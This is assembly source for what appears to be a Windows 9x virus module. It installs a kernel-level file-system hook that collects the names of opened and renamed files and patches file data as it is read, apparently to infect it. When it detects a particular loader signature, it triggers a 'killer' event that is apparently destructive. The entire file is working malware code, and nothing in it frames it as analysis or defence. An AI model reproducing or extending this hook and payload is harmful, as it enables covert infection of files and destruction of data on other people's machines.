
include                 IFSHAN.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\R0COPY\r0copy.inc
include                 ..\KILLER\killer.inc

                        extern  Event:PROC
                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

ifs_busy                db      0
ret_addr                dd      ?
dataptr                 dd      ?
old_hook_ptr            dd      ?
fname                   db      260 dup (?)

                        .code

HandleEvent:            cmp     dword ptr [esp+4], EV_R0COPY_IDLE
                        je      do_hook

                        xor     eax, eax
                        retn

do_hook:                pusha

                        push    offset new_hook
                        VxDcall IFSMGR, InstallFileSystemApiHook
                        add     esp, 4
                        mov     old_hook_ptr, eax

                        popa

                        mov     eax, 1          ; handled, we will stay TSR
                        retn

                        ; ESI=ifs_handler onstack shit
new_hook:
                        mov     eax, [esp]._function    ; check function

                        cmp     ifs_busy, 0
                        jne     __quit1
                        inc     ifs_busy

                        cmp     eax, IFSFN_OPEN
                        je      __func1
                        cmp     eax, IFSFN_RENAME
                        je      __func1
                        cmp     eax, IFSFN_FILEATTRIB
                        je      __func1

                        cmp     eax, IFSFN_READ
                        je      __func2

__exit1:
                        dec     ifs_busy
__quit1:
                        mov     eax, old_hook_ptr
                        jmp     dword ptr [eax]

__func1:                pusha
                        lea     esi, [esp+32]

                        mov     eax, [esi]._drive
                        or      al, al
                        jle     __quit

                        lea     edi, fname
                        cld
                        add     al, 'A'-1       ; drive
                        stosb
                        mov     al, ':'         ; ':'
                        stosb
                        mov     eax, [esi]._ioreq_ptr
                        mov     eax, [eax].ir_ppath ; eax <-- filename
                        add     eax, 4          ; skip "

                        push    [esi]._codepage ; BCS_WANSI/BCS_OEM
                        push    size fname      ; max name length
                        push    eax             ; uni-str
                        push    edi             ; output-str
                        VxDcall IFSMGR, UniToBCSPath
                        add     esp, 4*4

                        or      edx, edx        ; converted normally?
                        jnz     __quit
                        mov     [edi+eax], dl   ; 0

                        push    offset fname
                        push    EV_IFSHAN_GOT_FILENAME
                        call    Event
                        add     esp, 8

__quit:                 popa
                        jmp     __exit1

__func2:
                        mov     eax, [esp]._ioreq_ptr
                        mov     eax, [eax].ir_data
                        mov     dataptr, eax

                        mov     eax, old_hook_ptr
                        pop     ret_addr
                        call    dword ptr [eax]
                        push    ret_addr

                        pusha
                        mov     esi, [esp+32]._ioreq_ptr

                        cmp     [esi].ir_error, 0
                        jne     __quit2

                        mov     edx, dataptr
                        mov     ecx, [esi].ir_length

;       LDRWIN32.bin:
; 8BF2                  mov     esi, edx
; 813E50474E32          cmp     dword ptr [esi], 324E4750 ; '2NGP'
; 75xx                  jne     xxx

                        pusha
                        sub     ecx, 8
                        jbe     __endcycle
__cycle:                cmp     dword ptr [edx+0], 3E81F28Bh
                        jne     __cont
                        cmp     dword ptr [edx+4], 324E4750h
                        je      __found
__cont:                 inc     edx
                        loop    __cycle
__endcycle:             popa

                        push    0       ; do not use MZ-patch
                        push    ecx     ; size
                        push    edx     ; buf
                        callW   patch_buf
                        add     esp, 12

__quit2:                popa

                        dec     ifs_busy
                        retn

__found:                ; surprise for kewl haxors X-)))
                        push    0
                        push    EV_KILLER_DO_FUCKUP
                        call    Event
                        add     esp, 8

                        jmp     __endcycle

                        end
